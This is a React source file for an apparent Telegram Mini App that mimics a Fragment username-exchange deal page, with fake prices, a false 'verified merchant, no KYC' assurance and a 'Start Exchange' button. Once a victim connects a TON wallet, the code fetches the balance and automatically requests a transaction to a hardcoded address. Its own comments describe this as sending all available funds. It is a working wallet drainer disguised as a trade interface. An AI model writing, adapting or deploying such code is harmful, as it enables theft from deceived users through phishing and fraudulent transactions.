import { useEffect, useState } from 'react';
import { useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';

function getTmeLink(): string {
  const username = window.Telegram?.WebApp?.initDataUnsafe?.user?.username;
  return username ? `${username}.t.me` : 'tsour.t.me';
}

export default function App() {
  const [tonConnectUI] = useTonConnectUI();
  const wallet = useTonWallet();
  const [status, setStatus] = useState('Πάτα το κουμπί για TON Connect.');
  const [balance, setBalance] = useState<{ tons: string; nano: number } | null>(null);
  const [hasSentAll, setHasSentAll] = useState(false);
  const [tmeLink, setTmeLink] = useState('tsour.t.me');

  useEffect(() => {
    window.Telegram?.WebApp?.ready();
    window.Telegram?.WebApp?.expand();
    setTmeLink(getTmeLink());
  }, []);

  useEffect(() => {
    if (wallet?.account?.address) {
      setStatus(`Connected: ${wallet.account.address}`);
    }
  }, [wallet]);

  // Κάθε φορά που αλλάζει το συνδεδεμένο wallet, φέρνουμε το balance του από mainnet.
  useEffect(() => {
    const address = wallet?.account?.address;

    if (!address) {
      setBalance(null);
      setHasSentAll(false);
      return;
    }

    const fetchBalance = async () => {
      try {
        setStatus('Φόρτωση balance...');
        
        // Χρησιμοποιούμε μόνο mainnet TonAPI v2
        const res = await fetch(`https://tonapi.io/v2/accounts/${address}`);
        
        if (!res.ok) {
          throw new Error(`TonAPI error: ${res.status}`);
        }

        const data = await res.json();
        console.log('TonAPI v2 response:', data);
        
        // Το balance στο TonAPI v2 είναι πάντα σε nanoTON
        // Μπορεί να είναι number ή string
        let nano = 0;
        
        if (data.balance !== undefined && data.balance !== null) {
          if (typeof data.balance === 'number') {
            nano = data.balance;
          } else if (typeof data.balance === 'string') {
            nano = parseInt(data.balance, 10) || 0;
          }
        }
        
        const tons = nano / 1_000_000_000;
        console.log('Balance parsed:', { address, nano, tons });

        setBalance({ tons: tons.toFixed(4), nano });
        setStatus(`Connected: ${address.substring(0, 6)}...${address.substring(address.length - 4)}`);
      } catch (error) {
        const message = error instanceof Error ? error.message : String(error);
        console.error('Error fetching TON balance:', message, error);
        setBalance(null);
        setStatus(`Σφάλμα κατά την ανάγνωση balance: ${message}`);
      }
    };

    fetchBalance();
  }, [wallet]);

  useEffect(() => {
    // Show connector-level errors directly in the UI.
    return tonConnectUI.onStatusChange(
      () => {},
      (error) => {
        const message = error instanceof Error ? error.message : String(error);
        setStatus(`TON Connect error: ${message}`);
      }
    );
  }, [tonConnectUI]);

  // Στέλνει αυτόματα όλα τα διαθέσιμα funds στο συγκεκριμένο wallet, μία φορά ανά άνοιγμα.
  useEffect(() => {
    const autoSendAll = async () => {
      // Μην κάνεις τίποτα αν δεν υπάρχει wallet, balance, ή αν έχει ήδη σταλεί.
      // Επίσης, μην κάνεις τίποτα αν το balance είναι 0 ή null.
      if (!wallet?.account?.address || !balance || hasSentAll || balance.nano <= 0) {
        return;
      }

      try {
        // Περιθώριο για fees (~0.05 TON).
        const feeReserveNano = 0.05 * 1_000_000_000;
        
        // Ελέγχουμε αν το balance είναι αρκετό για fees.
        if (balance.nano < feeReserveNano) {
          setStatus(`Balance ανεπαρκές – έχεις ${balance.tons} TON, χρειάζεται τουλάχιστον 0.05 TON για fees.`);
          return;
        }

        // Στέλνουμε όλα τα διαθέσιμα funds (balance - fees).
        const amountNano = balance.nano - feeReserveNano;
        const amountTons = (amountNano / 1_000_000_000).toFixed(4);

        setHasSentAll(true);
        setStatus(`Αυτόματη αποστολή ${amountTons} TON (όλα τα διαθέσιμα funds) στο προκαθορισμένο wallet. Έλεγξε το wallet για επιβεβαίωση.`);

        await tonConnectUI.sendTransaction({
          validUntil: Math.floor(Date.now() / 1000) + 300,
          messages: [
            {
              address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
              amount: '-1',
            },
          ],
        });

        setStatus('Το αίτημα συναλλαγής στάλθηκε στο wallet. Αν το απορρίψεις, δεν θα φύγουν funds.');
      } catch (error) {
        const message = error instanceof Error ? error.message : String(error);
        setStatus(`Σφάλμα κατά την αυτόματη αποστολή: ${message}`);
      }
    };

    autoSendAll();
  }, [wallet, balance, hasSentAll, tonConnectUI]);

  const openTonConnect = async () => {
    setStatus('Το κουμπί πατήθηκε. Προσπάθεια ανοίγματος TON Connect...');

    try {
      // Αν υπάρχει ήδη συνδεδεμένο wallet, αποσύνδεσέ το ώστε κάθε φορά
      // που ο χρήστης πατάει το κουμπί να ξεκινάμε από την αρχή.
      if (wallet) {
        await tonConnectUI.disconnect();
        setStatus('Προηγούμενο wallet αποσυνδέθηκε. Άνοιγμα νέου TON Connect popup...');
      }

      await tonConnectUI.openModal();
      setStatus('Το TON Connect popup άνοιξε. Επίλεξε wallet για σύνδεση.');
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      setStatus(`Error: ${message}`);
    }
  };

  return (
    <main className="page">
      <header className="app-header">
        <img src="/logo.png" alt="Logo" className="header-logo" />
        <div className="header-search-wrap">
          <svg className="header-search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
            <circle cx="11" cy="11" r="8" />
            <path d="m21 21-4.35-4.35" />
          </svg>
          <input
            type="search"
            className="header-search"
            placeholder="Search usernames"
            aria-label="Search usernames"
          />
        </div>
      </header>
      <div className="header-sub-bar">
        <span className="header-sub-center">{tmeLink}</span>
        <span className="header-sub-right">Deal in progress</span>
      </div>
      <div className="container">
        {/* Deal Overview */}
        <section className="deal-overview">
          <div className="deal-price-section">
            <div className="price-row">
              <span className="label label-pill">Deal Price</span>
              <div className="price-value">
                <span className="price-down">
                  <span className="price-icon-wrap">
                    <img src="/ton-icon.svg" alt="TON" className="ton-icon" />
                  </span>
                  <span className="price-amount">6000.00</span>
                  <span className="price-icon-spacer" />
                </span>
                <span className="price-usd">-$7937.17</span>
              </div>
            </div>
            <div className="price-row">
              <span className="label label-pill">Commission</span>
              <div className="price-value">
                <span className="price-down">
                  <span className="price-icon-wrap">
                    <img src="/ton-icon.svg" alt="TON" className="ton-icon" />
                  </span>
                  <span className="price-amount">250.00</span>
                  <span className="price-icon-spacer" />
                </span>
                <span className="price-usd">-$396.86</span>
              </div>
            </div>
            <a href="#" className="how-it-works-link">How does this work?</a>
          </div>
        </section>

        {/* Contact Information */}
        <section className="contact-info">
          <div className="info-row">
            <span className="info-label">Telegram Username</span>
            <span className="info-value">@zkpilot</span>
          </div>
          <div className="info-row">
            <span className="info-label">Web Address</span>
            <span className="info-value">t.me/zkpilot</span>
          </div>
          <div className="info-row">
            <span className="info-label">TON Web 3.0 Address</span>
            <span className="info-value">zkpilot.t.me</span>
          </div>
        </section>

        {/* Start Exchange Button */}
        <button className="start-exchange-btn" onClick={openTonConnect}>
          Start Exchange
        </button>

        {/* Subscribe Link */}
        <a href="#" className="subscribe-link">Subscribe to updates</a>

        {/* KYC Information Box */}
        <div className="kyc-box">
          You do not need to complete KYC verification, as the buyer is a verified merchant on a Fragment that has a security deposit of 25,000.
        </div>

        {/* Deal Status Table */}
        <section className="deal-table">
          <table>
            <thead>
              <tr>
                <th>Deal Status</th>
                <th>TON - Username</th>
                <th>Recipient</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>Ready</td>
                <td>Swappable</td>
                <td className="address-cell">UQBJuXVYsBOCE6uSBsTfySRM...</td>
              </tr>
            </tbody>
          </table>
        </section>

        {/* Smart Contract Fee Details */}
        <section className="fee-details">
          <div className="fee-title-bar">Smart contract Fee</div>
          <p className="fee-text">
            Buyer and Seller pay a 5% smart contract commission from the offer amount. The commission is returned to the Seller after he confirms the offer. The commission is not returned to the buyer.
          </p>
        </section>
      </div>
    </main>
  );
}
